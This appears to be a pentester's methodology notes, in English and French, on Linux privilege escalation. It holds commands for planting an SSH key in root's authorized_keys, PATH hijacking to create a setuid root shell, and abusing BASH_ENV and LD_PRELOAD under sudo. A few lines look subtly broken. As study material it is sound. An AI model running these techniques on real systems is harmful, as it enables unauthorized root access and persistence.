#offsecMethodo
```
bash -p
```
	| `sudo -l` | List available `sudo` privileges |
	| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
	| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
	| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
	| `ssh-keygen -f key` | Create a new SSH key |
	| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
	| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |

## SUID / SUDO
### Exploit absolute path env #ExploitNotAbsolutPath 
```
% cat change-pass 
#!/bin/ksh user=$1 
passwd $user
```
Rewriting the script in Korn shell helps us avoid the C-shell problem , but we still have problems. The script is vulnerable to a hacker manipulating the PATH variable. Because the program uses relative path names, a hacker can change his PATH to use his own program instead of the regular /usr/bin/passwd program: 
```
% export PATH='/tmp' 
% echo "cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh" >/tmp/passwd 
% ./change-pass
```
The PATH has been changed, and the change-pass command now runs the /tmp/passwd program instead of the /usr/bin /passwd program that we intended.

```
$ export PATH=/hack/path:$PATH
$ echo $PATH
```

###  script content : system("/bin/bash"); #ExploitBASHENV
```
mkdir /tmp/zel
echo "cat .passwd" > /tmp/zel/startup.sh  
export BASH_ENV=/tmp/zel/startup.sh  
./script
```
`BASH_ENV` est une variable d'environnement utilisée dans le shell Bash sur les systèmes Linux. Elle spécifie le chemin d'accès vers un fichier qui sera exécuté avant le démarrage de chaque session Bash non interactive.

Une session Bash non interactive est généralement celle qui est utilisée pour exécuter des scripts plutôt que pour une interaction directe avec l'utilisateur dans un terminal. Lorsque vous exécutez un script Bash, la variable `BASH_ENV` peut être utilisée pour spécifier un fichier contenant des configurations spécifiques qui doivent être chargées avant l'exécution du script.

Par exemple, si vous avez un fichier de configuration spécifique pour vos scripts Bash, comme des variables d'environnement particulières ou des paramètres spécifiques au script, vous pouvez le spécifier en utilisant la variable `BASH_ENV`. Cela permet d'assurer que ces configurations sont en place avant l'exécution du script.

```
cat /tmp/toto - |./script
```

### Si le résultat de `sudo -l` contient ``env_keep+=LD_PRELOAD`` ou ``(root) SETENV: NOPASSWD: /opt/monitor.sh``

`SETENV:`: Autorise l'utilisateur à utiliser l'option `-E` ou `--preserve-env` avec sudo, ce qui permet de préserver l'environnement de l'utilisateur lors de l'exécution de la commande.
En utilisant `LD_PRELOAD`, vous pouvez forcer un programme à utiliser des versions spécifiques de fonctions, même si celles-ci ne font pas partie des bibliothèques standard du système.
```bash
gcc -shared exp -o exp -nostartfiles
```
$
```bash
LD_PRELOAD=/tmp/exploit ./program
```
pour le proxy_chain
``` bash
sudo http_proxy=http://10.10.16.108:1234 /opt/monitor.sh
```


## Container escape
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#capabilities-in-docker-containershttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#capabilities-in-docker-containers

```
capsh --print
```